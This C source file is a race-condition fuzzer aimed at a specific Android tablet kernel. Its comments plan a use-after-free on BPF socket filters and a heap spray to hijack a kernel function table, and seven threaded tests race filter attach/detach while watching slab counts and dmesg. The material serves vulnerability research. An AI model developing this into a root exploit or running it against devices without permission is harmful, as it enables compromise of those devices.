/*
 * bpf_filter_race.c — BPF sk_filter cleanup race fuzzer
 *
 * ATTACK THEORY:
 *   sk_filter objects are allocated in kmalloc-256 (with 22-26 BPF instructions).
 *   binder_thread is also in kmalloc-256.
 *   If we can free an sk_filter while it's still being used (UAF), we can spray
 *   a fake binder_thread or controlled data to hijack the filter's function table.
 *
 * RACE TARGETS:
 *   1. SO_ATTACH_FILTER + concurrent close() — race filter attach with fd destruction
 *   2. SO_DETACH_FILTER + concurrent recv() — race filter removal with active filtering
 *   3. Dual SO_ATTACH_FILTER from 2 threads — double-attach refcount confusion
 *   4. SO_ATTACH_FILTER + SO_DETACH_FILTER tight race — attach during detach
 *   5. fork() with attached filter + concurrent detach — shared socket filter race
 *   6. sendmsg + SO_DETACH_FILTER race — active filter use during removal
 *
 * Key 3.10.9 detail: sk_filter uses sk_filter_release() with refcount.
 * Race window: between refcount check and actual free in sk_filter_uncharge().
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o bpf_filter_race bpf_filter_race.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name))
            { val = a; break; }
    }
    fclose(f);
    return val;
}

/* BPF filter that accepts all packets — 22 instructions → kmalloc-256 */
static struct sock_fprog make_bpf_filter(void) {
    /* 22 instructions × 8 bytes = 176 bytes filter
     * sk_filter header ~48 bytes + 176 = 224 → kmalloc-256 */
    static struct sock_filter insns[22];
    for (int i = 0; i < 21; i++) {
        insns[i] = (struct sock_filter){ BPF_LD | BPF_W | BPF_ABS, 0, 0, 0 };
    }
    insns[21] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFFFFFF };

    struct sock_fprog prog = { .len = 22, .filter = insns };
    return prog;
}

/* ========== TEST 1: SO_ATTACH_FILTER + concurrent close ========== */

struct close_race_args {
    int fd;
    volatile int go;
    volatile int done;
};

static void *close_thread(void *arg) {
    struct close_race_args *a = (struct close_race_args *)arg;
    while (!a->go) sched_yield();
    close(a->fd);
    a->done = 1;
    return NULL;
}

static void test_attach_close_race(void) {
    printf("=== TEST 1: SO_ATTACH_FILTER + close() race ===\n");

    struct sock_fprog prog = make_bpf_filter();
    int anomalies = 0, errors = 0;
    int iters = 2000;

    for (int i = 0; i < iters; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        struct close_race_args args = { .fd = sv[0], .go = 0, .done = 0 };
        pthread_t t;
        pthread_create(&t, NULL, close_thread, &args);

        /* Race: attach filter while other thread closes fd */
        args.go = 1;
        int ret = setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_FILTER,
                            &prog, sizeof(prog));
        int err = errno;

        pthread_join(t, NULL);

        if (ret == 0) {
            /* Filter attached on a socket that's being closed — interesting! */
            anomalies++;
        }
        if (ret < 0 && err != EBADF && err != ENOTSOCK) {
            if (errors < 5)
                printf("  [%d] unexpected error: %s (errno=%d)\n", i, strerror(err), err);
            errors++;
        }

        close(sv[1]);

        if ((i + 1) % 500 == 0) {
            printf("  [%d/%d] anomalies=%d errors=%d\n", i + 1, iters, anomalies, errors);
            fflush(stdout);
        }
    }

    printf("  Result: %d anomalies, %d errors in %d iterations\n\n", anomalies, errors, iters);
}

/* ========== TEST 2: SO_DETACH_FILTER + concurrent recv ========== */

struct detach_recv_args {
    int fd;
    volatile int go;
    volatile int stop;
    int recv_count;
    int recv_errors;
};

static void *recv_thread(void *arg) {
    struct detach_recv_args *a = (struct detach_recv_args *)arg;
    char buf[64];
    while (!a->go) sched_yield();
    while (!a->stop) {
        int n = recv(a->fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n > 0) a->recv_count++;
        else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
            a->recv_errors++;
    }
    return NULL;
}

static void test_detach_recv_race(void) {
    printf("=== TEST 2: SO_DETACH_FILTER + recv() race ===\n");

    struct sock_fprog prog = make_bpf_filter();
    int anomalies = 0;
    int iters = 1000;

    for (int i = 0; i < iters; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        /* Attach filter */
        setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));

        /* Send some data for recv to process */
        char data[32] = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD";
        write(sv[1], data, sizeof(data));

        struct detach_recv_args args = {
            .fd = sv[0], .go = 0, .stop = 0,
            .recv_count = 0, .recv_errors = 0
        };
        pthread_t t;
        pthread_create(&t, NULL, recv_thread, &args);

        args.go = 1;
        usleep(10);  /* Let recv start */

        /* Detach filter while recv is active */
        int ret = setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER,
                            NULL, 0);

        args.stop = 1;
        pthread_join(t, NULL);

        if (args.recv_errors > 0) {
            anomalies++;
            if (anomalies <= 5)
                printf("  [%d] recv errors during detach: %d\n", i, args.recv_errors);
        }

        close(sv[0]); close(sv[1]);
    }

    printf("  Result: %d anomalies in %d iterations\n\n", anomalies, iters);
}

/* ========== TEST 3: Dual SO_ATTACH_FILTER from 2 threads ========== */

struct dual_attach_args {
    int fd;
    volatile int go;
    int result;
};

static void *attach_thread(void *arg) {
    struct dual_attach_args *a = (struct dual_attach_args *)arg;
    struct sock_fprog prog = make_bpf_filter();
    while (!a->go) sched_yield();
    a->result = setsockopt(a->fd, SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog));
    return NULL;
}

static void test_dual_attach_race(void) {
    printf("=== TEST 3: Dual SO_ATTACH_FILTER race (2 threads) ===\n");

    int both_succeed = 0;
    int iters = 2000;
    int k256_leaks = 0;

    for (int i = 0; i < iters; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        int k256_before = get_slab("kmalloc-256");

        struct dual_attach_args a1 = { .fd = sv[0], .go = 0, .result = -1 };
        struct dual_attach_args a2 = { .fd = sv[0], .go = 0, .result = -1 };

        pthread_t t1, t2;
        pthread_create(&t1, NULL, attach_thread, &a1);
        pthread_create(&t2, NULL, attach_thread, &a2);

        /* Fire! */
        a1.go = 1;
        a2.go = 1;

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        if (a1.result == 0 && a2.result == 0) {
            both_succeed++;
        }

        /* Detach (only removes the latest) */
        setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);

        close(sv[0]); close(sv[1]);

        int k256_after = get_slab("kmalloc-256");
        if (k256_after > k256_before + 2) k256_leaks++;

        if ((i + 1) % 500 == 0) {
            printf("  [%d/%d] both_succeed=%d k256_leaks=%d\n",
                   i + 1, iters, both_succeed, k256_leaks);
            fflush(stdout);
        }
    }

    printf("  Result: both_succeed=%d k256_leaks=%d in %d iterations\n\n",
           both_succeed, k256_leaks, iters);

    if (k256_leaks > 10) {
        printf("  *** kmalloc-256 LEAK from dual attach! ***\n");
        printf("  *** First filter not freed when second replaces it! ***\n\n");
    }
    if (both_succeed > 0) {
        printf("  *** DUAL ATTACH SUCCEEDED %d times! ***\n", both_succeed);
        printf("  *** Potential refcount confusion! ***\n\n");
    }
}

/* ========== TEST 4: Tight attach/detach race ========== */

struct attach_detach_args {
    int fd;
    volatile int stop;
    int attach_count;
    int attach_errors;
};

static void *attach_loop_thread(void *arg) {
    struct attach_detach_args *a = (struct attach_detach_args *)arg;
    struct sock_fprog prog = make_bpf_filter();
    while (!a->stop) {
        int r = setsockopt(a->fd, SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog));
        if (r == 0) a->attach_count++;
        else a->attach_errors++;
        usleep(1);
    }
    return NULL;
}

static void *detach_loop_thread(void *arg) {
    struct attach_detach_args *a = (struct attach_detach_args *)arg;
    while (!a->stop) {
        setsockopt(a->fd, SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);
        usleep(1);
    }
    return NULL;
}

static void test_attach_detach_race(void) {
    printf("=== TEST 4: Tight SO_ATTACH + SO_DETACH race ===\n");

    int sv[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, sv);

    int k256_before = get_slab("kmalloc-256");

    struct attach_detach_args args = {
        .fd = sv[0], .stop = 0,
        .attach_count = 0, .attach_errors = 0
    };

    pthread_t t_attach, t_detach;
    pthread_create(&t_attach, NULL, attach_loop_thread, &args);
    pthread_create(&t_detach, NULL, detach_loop_thread, &args);

    /* Run for 5 seconds */
    sleep(5);
    args.stop = 1;

    pthread_join(t_attach, NULL);
    pthread_join(t_detach, NULL);

    /* Cleanup */
    setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);

    int k256_after = get_slab("kmalloc-256");
    int delta = k256_after - k256_before;

    printf("  Attached %d times, errors %d\n", args.attach_count, args.attach_errors);
    printf("  kmalloc-256 delta: %+d\n", delta);

    close(sv[0]); close(sv[1]);

    /* Check for leaks after close */
    usleep(100000);
    int k256_final = get_slab("kmalloc-256");
    int leaked = k256_final - k256_before;

    printf("  kmalloc-256 after close: %+d (leaked=%d)\n", leaked, leaked);

    if (leaked > 5) {
        printf("  *** kmalloc-256 SLAB LEAK from attach/detach race! ***\n");
    }
    printf("\n");
}

/* ========== TEST 5: fork + shared socket + detach race ========== */

static void test_fork_detach_race(void) {
    printf("=== TEST 5: fork() + shared socket SO_DETACH_FILTER race ===\n");

    struct sock_fprog prog = make_bpf_filter();
    int anomalies = 0;
    int iters = 500;

    for (int i = 0; i < iters; i++) {
        int sv[2];
        socketpair(AF_UNIX, SOCK_STREAM, 0, sv);

        /* Attach filter before fork */
        setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));

        pid_t pid = fork();
        if (pid == 0) {
            /* Child: detach filter and close */
            setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);
            close(sv[0]); close(sv[1]);
            _exit(0);
        }

        /* Parent: simultaneously detach */
        usleep(1);
        int ret = setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);
        /* Also try recv to trigger filter use */
        char buf[32];
        write(sv[1], "test", 4);
        recv(sv[0], buf, sizeof(buf), MSG_DONTWAIT);

        int status;
        waitpid(pid, &status, 0);
        close(sv[0]); close(sv[1]);
    }

    /* Slab check */
    int k256 = get_slab("kmalloc-256");
    printf("  Done %d iterations, kmalloc-256=%d\n\n", iters, k256);
}

/* ========== TEST 6: sendmsg + SO_DETACH_FILTER race ========== */

struct sendmsg_race_args {
    int fd;
    volatile int go;
    volatile int stop;
    int send_count;
    int send_errors;
};

static void *sendmsg_thread(void *arg) {
    struct sendmsg_race_args *a = (struct sendmsg_race_args *)arg;
    char buf[128];
    memset(buf, 'X', sizeof(buf));

    struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
    struct msghdr msg = { 0 };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    while (!a->go) sched_yield();
    while (!a->stop) {
        if (sendmsg(a->fd, &msg, MSG_DONTWAIT) > 0) a->send_count++;
        else a->send_errors++;
    }
    return NULL;
}

static void test_sendmsg_detach_race(void) {
    printf("=== TEST 6: sendmsg + SO_DETACH_FILTER race ===\n");

    struct sock_fprog prog = make_bpf_filter();
    int anomalies = 0;
    int iters = 500;
    int k256_start = get_slab("kmalloc-256");

    for (int i = 0; i < iters; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));

        struct sendmsg_race_args args = {
            .fd = sv[1], .go = 0, .stop = 0,
            .send_count = 0, .send_errors = 0
        };
        pthread_t t;
        pthread_create(&t, NULL, sendmsg_thread, &args);
        args.go = 1;

        usleep(100);

        /* Race: detach filter while sendmsg is in flight */
        setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);
        usleep(10);
        /* Re-attach and detach rapidly */
        setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
        setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);

        args.stop = 1;
        pthread_join(t, NULL);

        /* Drain recv side */
        char drain[4096];
        while (recv(sv[0], drain, sizeof(drain), MSG_DONTWAIT) > 0);

        close(sv[0]); close(sv[1]);
    }

    usleep(100000);
    int k256_end = get_slab("kmalloc-256");
    printf("  kmalloc-256 delta: %+d over %d iterations\n", k256_end - k256_start, iters);

    if (k256_end - k256_start > 20) {
        printf("  *** kmalloc-256 LEAK from sendmsg/detach race! ***\n");
    }
    printf("\n");
}

/* ========== TEST 7: Massive attach/detach slab leak detector ========== */

static void test_mass_slab_leak(void) {
    printf("=== TEST 7: Mass attach/detach slab leak detector ===\n");

    struct sock_fprog prog = make_bpf_filter();
    int k256_start = get_slab("kmalloc-256");

    int cycles = 10000;
    for (int i = 0; i < cycles; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
        setsockopt(sv[0], SOL_SOCKET, SO_DETACH_FILTER, NULL, 0);
        close(sv[0]); close(sv[1]);

        if ((i + 1) % 2500 == 0) {
            int k256_now = get_slab("kmalloc-256");
            printf("  [%d/%d] k256 delta=%+d\n", i + 1, cycles, k256_now - k256_start);
        }
    }

    usleep(100000);
    int k256_end = get_slab("kmalloc-256");
    printf("  Final k256 delta: %+d over %d attach/detach cycles\n",
           k256_end - k256_start, cycles);

    if (k256_end - k256_start > 20) {
        printf("  *** BASELINE LEAK in BPF filter lifecycle! ***\n");
    }
    printf("\n");
}

int main(void) {
    printf("=== BPF sk_filter Cleanup Race Fuzzer ===\n");
    printf("SM-T377A kernel 3.10.9\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(300);  /* 5 min safety timeout */

    test_attach_close_race();
    test_detach_recv_race();
    test_dual_attach_race();
    test_attach_detach_race();
    test_fork_detach_race();
    test_sendmsg_detach_race();
    test_mass_slab_leak();

    /* Final dmesg */
    printf("--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|WARNING|"
           "slab|list_del|use.after|double.free|sk_filter|BPF' "
           "2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
